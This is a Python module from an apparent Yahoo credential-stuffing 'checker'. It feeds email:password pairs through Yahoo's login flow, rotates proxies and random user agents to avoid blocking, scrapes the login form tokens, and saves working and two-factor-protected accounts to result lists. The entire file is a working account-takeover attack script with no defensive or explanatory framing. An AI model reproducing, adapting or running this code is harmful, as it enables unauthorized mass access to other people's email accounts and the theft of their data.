from modules.variables import Checker
from modules.functions import bad_proxy, get_random_ua, log, save, set_proxy, return_proxy
from requests import Session
import functools
from requests.adapters import HTTPAdapter, Retry

def check(email:str,password:str):
    if '@' not in email:
        Checker.bad += 1
        return
    email = email.split('@')[0]+'@yahoo.com'
    username = email.replace('@yahoo.com','')
    while not Checker.stopping:
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)
            with Session() as s:

                user_agent = get_random_ua()

                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))
                
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ,
                    "Accept-Encoding": "gzip, deflate, br" ,
                    "Accept-Language": "en-US,en;q=0.9,fa;q=0.8" ,
                    "Cache-Control": "max-age=0" ,
                    "Connection": "keep-alive" ,
                    "Host": "login.yahoo.com" ,
                    "Referer": "https://www.google.com/" ,
                    "Sec-Fetch-Dest": "document" ,
                    "Sec-Fetch-Mode": "navigate" ,
                    "Sec-Fetch-Site": "cross-site" ,
                    "Sec-Fetch-User": "?1" ,
                    "Upgrade-Insecure-Requests": "1" ,
                    "User-Agent": user_agent ,
                }
                r = s.get('https://login.yahoo.com/',headers=headers)
                acrumb = r.text.split("\"acrumb\" value=\"")[1].split("\"")[0]
                session_index = r.text.split("sessionIndex\" value=\"")[1].split("\"")[0]

                data = {'acrumb':acrumb,'sessionIndex':session_index,'username':email,'passwd':None,'signin':'Next'}
                headers = {
                    "Content-Type":"application/x-www-form-urlencoded",
                    "Accept": "*/*" ,
                    "Accept-Encoding": "gzip, deflate, br" ,
                    "Accept-Language": "en-US,en;q=0.9,fa;q=0.8" ,
                    "bucket": "mbr-phoenix-gpst" ,
                    "Connection": "keep-alive" ,
                    "Host": "login.yahoo.com" ,
                    "Origin": "https://login.yahoo.com" ,
                    "Referer": "https://login.yahoo.com/" ,
                    "Sec-Fetch-Dest": "empty" ,
                    "Sec-Fetch-Mode": "cors" ,
                    "Sec-Fetch-Site": "same-origin" ,
                    "User-Agent": user_agent ,
                    "X-Requested-With": "XMLHttpRequest" ,
                }
                r = s.post('https://login.yahoo.com/',headers=headers,data=data)
                if "INVALID_USERNAME" in r.text or "INVALID_IDENTIFIER" in r.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "account/challenge/phone-obfuscation" in r.text or ">Open any Yahoo app<" in r.text:
                    if not Checker.cui: log("custom",":".join([email,password]),"Yahoo")
                    save("Yahoo","custom",Checker.time,":".join([email,password])+' | 2FA')
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                elif "done" not in r.text:
                    raise
                
                url = r.json()['location']
                if "recaptcha" in url:
                    raise
                
                data = {'crumb':'X6LSwBsh76P','acrumb':acrumb,'sessionIndex':session_index,'displayName':username,'username':username,'passwordContext':'normal','password':password,'verifyPassword':'Nästa'}
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ,
                    "Accept-Encoding": "gzip, deflate, br" ,
                    "Accept-Language": "en-US,en;q=0.9,fa;q=0.8" ,
                    "Cache-Control": "max-age=0" ,
                    "Connection": "keep-alive" ,
                    "Host": "login.yahoo.com" ,
                    "Origin": "https://login.yahoo.com" ,
                    "Referer": "https://login.yahoo.com/" ,
                    "Sec-Fetch-Dest": "document" ,
                    "Sec-Fetch-Mode": "navigate" ,
                    "Sec-Fetch-Site": "same-origin" ,
                    "Sec-Fetch-User": "?1" ,
                    "User-Agent": user_agent ,
                    "Content-Type":"application/x-www-form-urlencoded",
                }
                r = s.post(f'https://login.yahoo.com/{url}',data=data,headers=headers,allow_redirects=False)
                if "account/challenge/password" in r.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "/challenge/challenge-selector" in r.text or '/challenge/phone-obfuscation' in r.text:
                    if not Checker.cui: log("custom",":".join([email,password]),"Yahoo")
                    save("Yahoo","custom",Checker.time,":".join([email,password])+' | 2FA')
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                elif "consent" not in r.text:
                    raise
                
                if not Checker.cui: log("good",':'.join([email,password]),"Yahoo")
                save("Yahoo","good",Checker.time,':'.join([email,password]))
                Checker.good += 1
                return_proxy(proxy)
                return
        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1
        
        